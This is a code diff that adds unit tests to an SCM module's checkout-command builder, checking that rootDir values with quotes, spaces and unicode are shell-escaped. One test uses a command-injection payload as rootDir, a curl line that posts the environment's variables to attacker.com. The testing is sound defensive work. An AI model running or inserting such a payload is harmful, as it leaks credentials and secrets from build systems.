@@ -1399,6 +1399,39 @@ describe('index', function () {
             });
         });
 
+        it('escapes embedded single quotes in rootDir', () => {
+            config.rootDir = "foo'bar";
+
+            return scm.getCheckoutCommand(config).then(command => {
+                assert.include(command.command, "cd 'foo'\\''bar'");
+            });
+        });
+
+        it('neutralizes a command-injection payload in rootDir', () => {
+            config.rootDir = ';curl -s -X POST https://attacker.com -d "$(env)"';
+
+            return scm.getCheckoutCommand(config).then(command => {
+                assert.include(
+                    command.command,
+                    `cd '${config.rootDir}'`,
+                    'the payload must land entirely inside a single-quoted cd argument'
+                );
+                assert.notMatch(
+                    command.command.split(`cd '${config.rootDir}'`)[0],
+                    /curl/,
+                    'no part of the payload should execute before the quoted cd argument'
+                );
+            });
+        });
+
+        it('preserves rootDir values with spaces and unicode', () => {
+            config.rootDir = 'path/to/日本語 dir';
+
+            return scm.getCheckoutCommand(config).then(command => {
+                assert.include(command.command, "cd 'path/to/日本語 dir'");
+            });
+        });
+
         it('rejects PR branch names containing shell metacharacters', () => {
             config.prRef = `'"\`;!&$<>|`;
 
